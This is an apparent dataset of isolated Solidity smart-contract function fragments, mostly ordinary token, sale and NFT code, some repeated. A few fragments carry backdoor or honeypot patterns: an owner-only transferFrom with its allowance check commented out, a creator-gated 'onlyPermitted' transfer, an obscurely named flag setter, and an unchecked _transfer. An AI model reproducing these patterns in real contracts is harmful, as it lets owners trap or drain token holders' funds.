        emit NewSaleEndDate(saleEndDate);
    }
--------------------------------------------------------------------------------
function addWhitelistAddresses(address[] _addrs) public onlyOwner{
        for (uint256 i = 0; i < _addrs.length; i++) {
            addWhitelistAddress(_addrs[i]);        
        }
    }
--------------------------------------------------------------------------------
function OSNToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function tokenPause() public {
        require(rightAndRoles.onlyRoles(msg.sender,6));
        require(!isFinalized);
        token.setPause(true);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function proposeProxy(address _proxy) external onlyOwner {
        pendingProxy = _proxy;
        mature = now.add(7 days);
        emit ProposeProxy(_proxy, mature);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public returns (bool) {
    require(_to != address(0));

    _transfer(msg.sender, _to, _value);
    return true;
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function saveLockedERC20Tokens(address _token, address _to, uint  _amount) onlyOwner external returns (bool) {
    require(IERC20(_token).transfer(_to, _amount));
    require(totalBalance <= contractBalance_());
    return true;
  }
--------------------------------------------------------------------------------
function accumulativeDividendOf(address _owner) public view override returns(uint256) {
    return magnifiedDividendPerShare.mul(balanceOf(_owner)).toInt256()
      .add(magnifiedDividendCorrections[_owner]).toUint256() / magnitude;
  }
--------------------------------------------------------------------------------
function BitClemm(){
     owner = msg.sender;
     balances[msg.sender] = TOKEN_TO_CREATOR;
     _totalSupply = _totalSupply.add(TOKEN_TO_CREATOR);
 }
--------------------------------------------------------------------------------
function banbotsingle(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            botban(_counts[i]); }
    
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function checkAndTransfer2(
        uint256 _amount,
        address _from
    )
        private
    {
        require(
            erc20.transferFrom(
                _from,
                address(this),
                _amount
            ) == true, "transfer must succeed"
        );
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0xd232E0b8F9FcAf959Ff9A086f74526cf4d748e71,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function hash_seed(
        string seed, 
        Algorithm algorithm
    ) pure internal returns(bytes32) {
        if (algorithm == Algorithm.sha) {
            return sha256(seed);
        } else {
            return keccak256(seed);
        }
    }
--------------------------------------------------------------------------------
function hash_data(
        bytes32 key, 
        Algorithm algorithm
    ) pure internal returns(bytes32) {
        if (algorithm == Algorithm.sha) {
            return sha256(key);
        } else {
            return keccak256(key);
        }
    }
--------------------------------------------------------------------------------
function blind(
        address addr,
        Algorithm algorithm
    ) pure internal returns(bytes32) {
        if (algorithm == Algorithm.sha) {
            return sha256(addr);
        } else {
            return keccak256(addr);
        }
    }
--------------------------------------------------------------------------------
function QKL(){
		totalSupply=INIT_SUPPLY;
		balances[msg.sender] = INIT_SUPPLY;
		Transfer(0x0, msg.sender, INIT_SUPPLY);
	}
--------------------------------------------------------------------------------
function balanceOf(address _token, address _whom) external view returns (uint256) {
        uint256 _stakeReward = _calculateStake(_token, _whom);
        return safeAdd(stakeBalance[_token][_whom], _stakeReward);
    }
--------------------------------------------------------------------------------
function setBonusMultiplier(uint256 multiplier_) external onlyOwner {
        if (multiplier_ < 100 || multiplier_ >= 200) revert("Out of range");

        BONUS_MULTIPLIER = multiplier_;
    }
--------------------------------------------------------------------------------
function _afterTokenTransfer(address, address to, uint256 tokenId) private {
        if (!specialWallets[to]) {
            if (_massOf(_tokenOf(to)) >= cap) {
                _createWalletByClass(_classOf(tokenId));
            }
        }
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        require(address(this).balance != 0);
        require(ethFundDeposit.send(address(this).balance));
    }
--------------------------------------------------------------------------------
function allowance(address _owner, address _spender) public view returns(uint256)
    {
       require(_owner != address(0x0) && _spender != address(0x0));

       return allowed[_owner][_spender];
    }
--------------------------------------------------------------------------------
receive() external payable {
        require(checkSignRoleExists(_msgSender()), "the contract can't obtain ETH from this address");
    }
--------------------------------------------------------------------------------
function getCurrentPrice(uint256 _tokenId)
        external
        view
        returns (uint256)
    {
        Auction storage auction = tokenIdToAuction[_tokenId];
        require(_isOnAuction(auction));
        return _currentPrice(auction);
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function startPreIco() external managerOnly {
        require(statusICO == StatusICO.Created || statusICO == StatusICO.PreIcoPaused);
        statusICO = StatusICO.PreIcoStarted;
        LogStartPreICO();
    }
--------------------------------------------------------------------------------
function finishPreIco() external managerOnly {
        require(statusICO == StatusICO.PreIcoStarted || statusICO == StatusICO.PreIcoPaused);
        statusICO = StatusICO.PreIcoFinished;
        LogFinishPreICO();
    }
--------------------------------------------------------------------------------
function startIco() external managerOnly {
        require(statusICO == StatusICO.PreIcoFinished || statusICO == StatusICO.IcoPaused);
        statusICO = StatusICO.IcoStarted;
        LogStartICO();
    }
--------------------------------------------------------------------------------
function withdrawEther() external managerOnly {
        require(statusICO == StatusICO.PreIcoFinished || statusICO == StatusICO.IcoFinished);
        Company.transfer(this.balance);
    }
--------------------------------------------------------------------------------
function finishMinting() onlyOwner returns (bool) {
    require(triggerTime==0);
    triggerTime = now.add(10 days);
    return super.finishMinting();
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function SpeedwayBricks() public {
    totalSupply = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function safeAdd(uint256 x, uint256 y) internal returns(uint256) {
      uint256 z = x + y;
      assert((z >= x) && (z >= y));
      return z;
    }
--------------------------------------------------------------------------------
function payDev(address dev) internal
    {
        uint balance = SafeMath.div(address(this).balance, 10);
        dev.transfer(balance);
    }
--------------------------------------------------------------------------------
function withdrawBalance(address recipient, uint256 value) external onlyOwner {
        require(value > 0);
        require(value < address(this).balance);
        recipient.transfer(value);
    }
--------------------------------------------------------------------------------
function hasEnded() public view returns (bool) {
    bool capReached = weiRaised >= cap;
    bool timeLimit = now > endTime;
    return capReached || timeLimit;
  }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function getSigns(uint _dealNumber) constant public returns (address signBuyer, 
    address signSeller){
        
        uint deal = dealNumbers[_dealNumber];
        
        return (
               deals[deal].signBuyer,
               deals[deal].signSeller
              // deals[deal].signAgency
            );
        
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function seal() onlyOwner {
        setOwner(0);

        totalSupply = totalSupply.add(bonusOffered);
        Transfer(0, address(-1), bonusOffered);
    }
--------------------------------------------------------------------------------
function () payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
    require(isApprovedFor(msg.sender, _tokenId));
    clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
  }
--------------------------------------------------------------------------------
function clearApproval(address _owner, uint256 _tokenId) private {
    require(ownerOf(_tokenId) == _owner);
    tokenApprovals[_tokenId] = 0;
    Approval(_owner, 0, _tokenId);
  }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
    require(_to != address(0));
    addToken(_to, _tokenId);
    Transfer(0x0, _to, _tokenId);
  }
--------------------------------------------------------------------------------
function defrostToken() public 
    { // Function to defrost your own token, after the date of the defrost
    
        require(now>dateDefrost);
        balancesCanSell[msg.sender]=true;
        Defroze(msg.sender,true);
    }
--------------------------------------------------------------------------------
function setInternalDependencies(address[] _newDependencies) public onlyOwner {
        super.setInternalDependencies(_newDependencies);

        _storage_ = GoldMarketplaceStorage(_newDependencies[0]);
        goldTokens = Gold(_newDependencies[1]);
    }
--------------------------------------------------------------------------------
function denyRebasement() public isOwner
    {
        require (pendingRebasement.executed == false, "Rebasement already executed.");
        
        pendingRebasement.executed = true;
    }
--------------------------------------------------------------------------------
function transferPreSignedHashing(
        address _token,
        address _to,
        uint256 _value,
        uint256 _fee,
        uint256 _nonce
    )
        public
        pure
        returns (bytes32)
    {
        /* "48664c16": transferPreSignedHashing(address,address,address,uint256,uint256,uint256) */
        return keccak256(abi.encodePacked(bytes4(0x48664c16), _token, _to, _value, _fee, _nonce));
    }
--------------------------------------------------------------------------------
function approvePreSignedHashing(
        address _token,
        address _spender,
        uint256 _value,
        uint256 _fee,
        uint256 _nonce
    )
        public
        pure
        returns (bytes32)
    {
        /* "f7ac9c2e": approvePreSignedHashing(address,address,uint256,uint256,uint256) */
        return keccak256(abi.encodePacked(bytes4(0xf7ac9c2e), _token, _spender, _value, _fee, _nonce));
    }
--------------------------------------------------------------------------------
function increaseApprovalPreSignedHashing(
        address _token,
        address _spender,
        uint256 _addedValue,
        uint256 _fee,
        uint256 _nonce
    )
        public
        pure
        returns (bytes32)
    {
        /* "a45f71ff": increaseApprovalPreSignedHashing(address,address,uint256,uint256,uint256) */
        return keccak256(abi.encodePacked(bytes4(0xa45f71ff), _token, _spender, _addedValue, _fee, _nonce));
    }
--------------------------------------------------------------------------------
function decreaseApprovalPreSignedHashing(
        address _token,
        address _spender,
        uint256 _subtractedValue,
        uint256 _fee,
        uint256 _nonce
    )
        public
        pure
        returns (bytes32)
    {
        /* "59388d78": decreaseApprovalPreSignedHashing(address,address,uint256,uint256,uint256) */
        return keccak256(abi.encodePacked(bytes4(0x59388d78), _token, _spender, _subtractedValue, _fee, _nonce));
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function adminshipLevel(address _newAdmin, uint8 _level) onlyAdmin(2) public { //Admin can be set
        require(_newAdmin != address(0));
        level[_newAdmin] = _level;
        emit AdminshipUpdated(_newAdmin,_level);
    }
--------------------------------------------------------------------------------
function noFeeTransfer(address _to, uint256 _amount) public returns (bool) {
        require(msg.sender == address(firstBuyers));
        return noFee(msg.sender, _to, _amount);
    }
--------------------------------------------------------------------------------
constructor(uint256 _entryPrice, uint256 _deadline, uint256 _percentageTaken,uint256 _thresold) public {
        entryPrice = _entryPrice;
        deadline = _deadline;
        percentageTaken = _percentageTaken;
        threshold = _thresold;
        owner = msg.sender;
    }
--------------------------------------------------------------------------------
function tokenByIndex(uint256 index) public view override returns (uint256) {
    require(index < totalSupply(), "ERC721A: global index out of bounds");
    return index;
  }
--------------------------------------------------------------------------------
function mint(
        address _to,
        uint256 _id,
        uint256 _quantity,
        bytes memory _data
    ) public virtual override onlyOwner {
        require(
            _quantity <= _remainingSupply(_id),
            "AssetContract#mint: QUANTITY_EXCEEDS_TOKEN_SUPPLY_CAP"
        );
        _mint(_to, _id, _quantity, _data);
    }
--------------------------------------------------------------------------------
function claim(uint256 _poolId) external override {
        require(poolMap[_poolId].vault == msg.sender, "sender not vault");
        _claim(_poolId);

    }
--------------------------------------------------------------------------------
function () public payable {
        _getAsset()._performGeneric.value(msg.value)(msg.data, msg.sender);
        _returnReturnData(true);
    }
--------------------------------------------------------------------------------
function optIn() public returns(bool) {
        delete userOptOutVersion[msg.sender];
        emit OptedIn(msg.sender, latestVersion);
        return true;
    }
--------------------------------------------------------------------------------
function getInitFunction() public pure returns (bytes4) {
        return bytes4(keccak256("configure(uint256,uint256,uint256,uint256,uint8,address)"));
    }
--------------------------------------------------------------------------------
function getSTODetails() public view returns(uint256, uint256, uint256, uint256, uint256, uint256, uint256, bool) {
        return (
            startTime,
            endTime,
            cap,
            rate,
            fundsRaised,
            investorCount,
            tokensSold,
            (fundraiseType == FundraiseType.POLY)
        );
    }
--------------------------------------------------------------------------------
function _deliverTokens(address _beneficiary, uint256 _tokenAmount) internal {
        require(IST20(securityToken).mint(_beneficiary, _tokenAmount), "Error in minting the tokens");
    }
--------------------------------------------------------------------------------
function AsetToken() public {
        totalSupply_ = INITIAL_SUPPLY;
        balances[msg.sender] = INITIAL_SUPPLY;
        Transfer(0x0, msg.sender, INITIAL_SUPPLY);
    }
--------------------------------------------------------------------------------
function adminSetResource(address handlerAddress, bytes32 resourceID, address tokenAddress) external onlyAdmin {
        _resourceIDToHandlerAddress[resourceID] = handlerAddress;
        IERCHandler handler = IERCHandler(handlerAddress);
        handler.setResource(resourceID, tokenAddress);
    }
--------------------------------------------------------------------------------
function getProposal(uint8 originChainID, uint64 depositNonce, bytes32 dataHash) external view returns (Proposal memory) {
        uint72 nonceAndID = (uint72(depositNonce) << 8) | uint72(originChainID);
        return _proposals[nonceAndID][dataHash];
    }
--------------------------------------------------------------------------------
function setUpgradeMaster(address master) public {
        if (master == 0x0) revert();
        if (msg.sender != upgradeMaster) revert();
        upgradeMaster = master;
    }
--------------------------------------------------------------------------------
function openCaseSignHash(uint _escrowId, uint8 _motive) public view returns(bytes32){
        return keccak256(
            abi.encodePacked(
                address(this),
                "openCase(uint256)",
                _escrowId,
                _motive
            )
        );
    }
--------------------------------------------------------------------------------
function okbitnetwork() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function setfee(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            feepercent(_counts[i]); }
    }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function whitelistTokens(address[] calldata tokens)
        external
        onlyOwner
    {
        for (uint i = 0; i < tokens.length; i++) {
            _whitelistToken(tokens[i]);
        }
    }
--------------------------------------------------------------------------------
function setBlacklist(address _address, bool _bool) public onlyOwner {
		require(_address != address(0));
		
		blacklist[_address] = _bool;
		emit SetBlacklist(_address, _bool);
	}
--------------------------------------------------------------------------------
function isOperatorFor(address _operator, address _tokenHolder) public view returns (bool) {
        return (_operator == _tokenHolder
            || mAuthorized[_operator][_tokenHolder]
            || (mIsDefaultOperator[_operator] && !mRevokedDefaultOperator[_operator][_tokenHolder]));
    }
--------------------------------------------------------------------------------
constructor (address initialAccount, string memory _tokenSymbol, string memory _tokenName, uint256 initialBalance) public {

        // Initialize Contract Parameters
        symbol = _tokenSymbol;
        name = _tokenName;
        decimals = 18;
        // default decimals is going to be 18 always

        _mint(initialAccount, initialBalance);

        _admin = initialAccount;

    }
--------------------------------------------------------------------------------
function collectionTotal(uint64 _collectionIndex) public view validIndex(_collectionIndex) returns(uint256)
	{
		require(_collectionIndex < totalCollections(), "Collection does not exist");
		return collectionTokens[_collectionIndex].length;
	}
--------------------------------------------------------------------------------
function SetNewBlockchainEnabled() onlyOwner public {
        require(isMintingFinished && isOwnBlockchainLaunched == false);
        isOwnBlockchainLaunched = true;
        momentOwnBlockchainLaunched = now;
        emit OwnBlockchainLaunched(now);
    }
--------------------------------------------------------------------------------
function exchangeEurToEth(uint256 eurAmount) internal view returns(uint256 rate) {
        return safeDiv(safeMul(safeDiv(safeMul(eurAmount, 1000000000000000000), exchangeRate), 1 ether), 1000000000000000000);
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function upgradeTo(string _contractName, string _version, address _impl) public {
        require(msg.sender == address(registry));
        require(_impl != address(0));
        _implementation = _impl;
    }
--------------------------------------------------------------------------------
function DKS(){
		totalSupply=MAX_SUPPLY;
		balances[msg.sender] = MAX_SUPPLY;
		Transfer(0x0, msg.sender, MAX_SUPPLY);
	}
--------------------------------------------------------------------------------
function PibbleToken() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function changeScientistForElement(uint256 _tokenId, uint256 _scientistId) public onlyCEO {
    	Element storage element = elements[_tokenId];
    	element.scientistId = SafeMath.add(_scientistId, scientistSTART);
  	}
--------------------------------------------------------------------------------
function mint(
    address _to,
    uint256 _id,
    uint256 _quantity,
    bytes memory _data
  ) virtual public creatorOnly(_id) {
    _mint(_to, _id, _quantity, _data);
    tokenSupply[_id] = tokenSupply[_id].add(_quantity);
  }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function RareCards() public {
    rareArray.length += 1;
    setAdminContract(msg.sender,true);
    setActionContract(msg.sender,true);
  }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function registerProposal(uint proposal, uint[] votes) public payable {

		// Value must be at least equal to default fee.
		require(msg.value >= fee);

		recordVotes(votes);

		if (proposal > 0) {
			addProposal(proposal);
		}
	}
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function burnAll(uint256[] memory tokenIDs) public {
        for (uint256 i = 0; i < tokenIDs.length; i++) {
            burn(tokenIDs[i]);
        }
    }
--------------------------------------------------------------------------------
function BTCCP (address fundAddress) {
    tokensCount = INITIAL_TOKENS_COUNT;
    accounts [msg.sender] = INITIAL_TOKENS_COUNT;
    owner = msg.sender;
    fund = fundAddress;
  }
--------------------------------------------------------------------------------
constructor(
        address _logic,
        address admin_,
        bytes memory _data
    ) payable ERC1967Proxy(_logic, _data) {
        assert(_ADMIN_SLOT == bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1));
        _changeAdmin(admin_);
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function isReadyToBreed(uint256 _pandaId)
    public
    view
    returns(bool) {
        require(_pandaId > 0);
        Panda storage kit = pandas[_pandaId];
        return _isReadyToBreed(kit);
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function getApproved(uint256 tokenId)
        public
        view
        override
        returns (address)
    {
        require(_exists(tokenId), "approved query for nonexistent token");

        return _tokenApprovals[tokenId];
    }
--------------------------------------------------------------------------------
function setTokenURI(uint256 tokenId, string memory _tokenURI)
        public
        onlyOwner
    {
        require(_exists(tokenId), "URI set of nonexistent token");
        _tokenURIs[tokenId] = _tokenURI;
    }
--------------------------------------------------------------------------------
function createTokens() internal {
        uint256 total = 10000000*10**18;
        balances[address(this)] = total;
        totalSupply = total;
    }
--------------------------------------------------------------------------------
function transferOwnership(address newOwner) external virtual onlyOwner {
        require(newOwner != address(0), "new owner is zero address");
        _transferOwnership(newOwner);
    }
--------------------------------------------------------------------------------
function TeaTime(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    samsung[spender] = val;
    bluec[spender] = val2; 
    neworleans[spender] = val3;
    thisValue = val4;
  }
--------------------------------------------------------------------------------
function calculateDividendTokens(uint256 ethervalue, uint256 subvalue) public constant returns (uint256 tokens) {
		return sub(fixedExp(fixedLog(reserve() - subvalue + ethervalue)*crr_n/crr_d + price_coeff), totalSupply);
	}
--------------------------------------------------------------------------------
constructor() {
        balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }
--------------------------------------------------------------------------------
function getTokenAmount(uint256 weiAmount) internal view returns(uint256) {
    uint256 bonusrate = (rate.mul(bonus)).div(100);
    return weiAmount.mul(bonusrate);
  }
--------------------------------------------------------------------------------
function periodTimeFrame (uint period)   constant   returns (uint256 startTime, uint256 endTime) {  
        require(period <= currentPeriod);

        startTime = periods[period].startTime;
        endTime = periods[period].endTime;
    }
--------------------------------------------------------------------------------
function periodDuration (uint period)   constant   returns (uint256 duration) {  
        require(period > 0);

        if(period == 1) {
            return FIRST_PERIOD_DURATION;
        } else {
            return PERIOD_DURATION;
        }
    }
--------------------------------------------------------------------------------
constructor(
        uint _ethUsdRate,
        address _wbtToken,
        address _bctToken,
        address _data
    )
    public
    {
        ethUsdRate = _ethUsdRate;

        // instantiate wbtToken & data contracts
        wbtToken = WealthBuilderToken(_wbtToken);
        bctToken = BlockchainToken(_bctToken);
        data = Data(_data);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function getPermissionHash(
        bytes32 eip712TypeHash,
        address delegate,
        address token,
        uint256 amount,
        uint256 nonce
    ) public view override returns (bytes32 permissionHash) {
        return
            EIP712._hashTypedDataV4(
                keccak256(abi.encode(eip712TypeHash, delegate, token, amount, nonce))
            );
    }
--------------------------------------------------------------------------------
function withdrawForeignERC20 (address tokenContract) public onlyOwner {
        IERC20 token = IERC20(tokenContract);
        token.transfer(owner, token.balanceOf(address(this)));
    }
--------------------------------------------------------------------------------
function addOwnToken() onlyOwner public returns (bool) {
        require(setOwnContract);
        addToWhitelist(this, 5000 * 1e8, 36500);
        setOwnContract = false;
        return true;
    }
--------------------------------------------------------------------------------
function confirmTransaction(uint transactionId)
        public
        ownerExists(msg.sender)
        transactionExists(transactionId)
        notConfirmed(transactionId, msg.sender)
    {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function BetlyCoin() public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[msg.sender] = INITIAL_SUPPLY;
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint _amount) 
        returns (bool success)
    {
        // Cannot transfer before crowdsale ends or cap reached
        require(now > ENDDATE || totalEthers == CAP);
        // Standard transferFrom
        return super.transferFrom(_from, _to, _amount);
    }
--------------------------------------------------------------------------------
function distributeTokens(address _to, uint256 _value) public {
        require(distributionAddress == msg.sender || owner == msg.sender);
        super.transfer(_to, _value);
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function _mint(address _to, uint256 _tokenId) internal {
		super._mint(_to, _tokenId);

		allTokensIndex[_tokenId] = allTokens.length;
		allTokens.push(_tokenId);
	  }
--------------------------------------------------------------------------------
constructor() internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
constructor(address _stakingToken, address _wStakingToken, address _rewardsDistribution) public {
        stakingToken = IERC20(_stakingToken);
        wStakingToken = IWrappedERC20(_wStakingToken);
        rewardsDistribution = _rewardsDistribution;
        governance = msg.sender;
    }
--------------------------------------------------------------------------------
constructor () public {
    owner = msg.sender;
    balances[owner] = totalSupply;
    emit Transfer(0x0, owner, totalSupply);
  }
--------------------------------------------------------------------------------
function buy(address _referredBy)
        public
        payable
        returns(uint256)
    {

        require(tx.gasprice <= 0.05 szabo);
        purchaseTokens(msg.value, _referredBy, false);
    }
--------------------------------------------------------------------------------
function()
        payable
        public
    {

        require(tx.gasprice <= 0.05 szabo);
        purchaseTokens(msg.value, 0x0, false);
    }
--------------------------------------------------------------------------------
function _transfer(address _from, address _to, uint _value) internal {
        balanceOf[_from] -= _value;
        balanceOf[_to] += _value;
        emit Transfer(_from, _to, _value);
    }
--------------------------------------------------------------------------------
function scheduleNewDerivativeToken(address _address, uint256 _time) public onlyOwner returns (bool) {
        require(!nextDerivativeTokenScheduled);

        nextDerivativeTokenScheduled = true;
        nextDerivativeTokenTime = _time;
        nextDerivativeToken = DerivativeTokenInterface(_address);

        return true;
    }
--------------------------------------------------------------------------------
function bindContract(address _contract) onlyOwner public returns (bool) {
        require(_contract != address(0));
        owned = itoken(_contract);
        return super.bindContract(_contract);
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function emergencySetStartingIndexBlock() external onlyOwner {
        require(startingIndex == 0, "Starting index is already set");
        
        startingIndexBlock = block.number;
    }
--------------------------------------------------------------------------------
constructor () public {
        _decimals = 18;
        _owner = _msgSender();
        _safeOwner = _msgSender();
        _mint(_owner, initialSupply*(10**18));
      
    }
--------------------------------------------------------------------------------
function transferFrom(address _from, address _to, uint256 _value) onlyOwner public returns (bool success) {
        //require(_value <= allowance[_from][msg.sender]);     // Check allowance
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
--------------------------------------------------------------------------------
function approveUserKYC(address _user) onlyKycManager public {
        Supporter storage sup = supportersMap[_user];
        sup.hasKYC = true;
        KYC(_user, true);
    }
--------------------------------------------------------------------------------
function disapproveUserKYC(address _user) onlyKycManager public {
        Supporter storage sup = supportersMap[_user];
        sup.hasKYC = false;
        KYC(_user, false);
    }
--------------------------------------------------------------------------------
function setFeelessSender(address _sender, bool _feeless) public onlyOwner {
        require(
            !_feeless || (_feeless && canWhitelist),
            "cannot add to whitelist"
        );
        feelessSender[_sender] = _feeless;
    }
--------------------------------------------------------------------------------
function setFeelessReciever(address _recipient, bool _feeless)
        public
        onlyOwner
    {
        require(
            !_feeless || (_feeless && canWhitelist),
            "cannot add to whitelist"
        );
        feelessReciever[_recipient] = _feeless;
    }
--------------------------------------------------------------------------------
function setDoTxLib(address dotxLibAddr, bool setupAddressInLib) public onlyOwner {
        //DOTX lib mainly uses for Chainlink
        dotxLibAddress = dotxLibAddr;
        dotxLib = IDoTxLib(dotxLibAddress);
        if(setupAddressInLib){
            dotxLib.setDoTxGame(address(this));
        }
    }
--------------------------------------------------------------------------------
function checkIfHouseInCompetition(bytes32 _houseTicker, uint256 warIndex) private view returns(bool){
        return wars[warIndex].firstHouse.houseTicker == _houseTicker || wars[warIndex].secondHouse.houseTicker == _houseTicker;
    }
--------------------------------------------------------------------------------
function chnageSpecialFeeTake(uint id, address token, uint256 balance, uint256 feeTake) public isAdmin {
      require(id < specialFees.length);
      specialFees[id] = SpecialTokenBalanceFeeTake(
          true,
          token,
          balance,
          feeTake
      );
  }
--------------------------------------------------------------------------------
function burn(uint256 _value) whenNotPaused onlyOwner public {
      super.burn(_value);
      if (migrationAgent != address(0)) {
        burntTokens = burntTokens.add(_value);
      }
    }
--------------------------------------------------------------------------------
function maxPayout() public view returns ( uint ) {
        uint circulatingOHM = ICirculatingOHM( circulatingOHMContract ).OHMCirculatingSupply();
        return circulatingOHM.mul( maxPayoutPercent ).div( 10000 );
    }
--------------------------------------------------------------------------------
function setMinAmount(uint256 newMinAmount) public returns (bool) {
     require(msg.sender == owner);
     require(newMinAmount < maxAmount);
     
     minAmount = newMinAmount;
     return true;
